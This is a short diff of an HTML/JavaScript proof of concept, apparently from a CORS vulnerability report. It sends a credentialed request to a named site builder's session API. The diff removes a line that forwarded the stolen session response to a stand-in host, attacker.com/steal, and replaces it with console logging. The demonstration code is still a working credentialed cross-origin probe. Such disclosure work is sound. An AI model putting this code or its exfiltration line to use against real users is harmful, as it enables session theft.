@@ -1,12 +1,24 @@
+<!-- Save this as an HTML file and open it in your browser -->
 <script>
 fetch('https://sitebuilder.xsolla.com/api/session', {
     method: 'POST',
     credentials: 'include',
     mode: 'cors'
 })
-.then(response => response.text())
-.then(data => {
-    fetch('https://attacker.com/steal?data=' + btoa(data));
+.then(response => {
+    // Log the full response object to the console
+    console.log('Response status:', response.status);
+    console.log('Response headers:', response.headers);
+    
+    // Try to read the response body as text
+    return response.text();
 })
-.catch(err => console.log('Error:', err));
+.then(data => {
+    // Log the actual response data to the console
+    console.log('Response data:', data);
+})
+.catch(err => {
+    // Log any errors to the console
+    console.error('Error:', err);
+});
 </script>
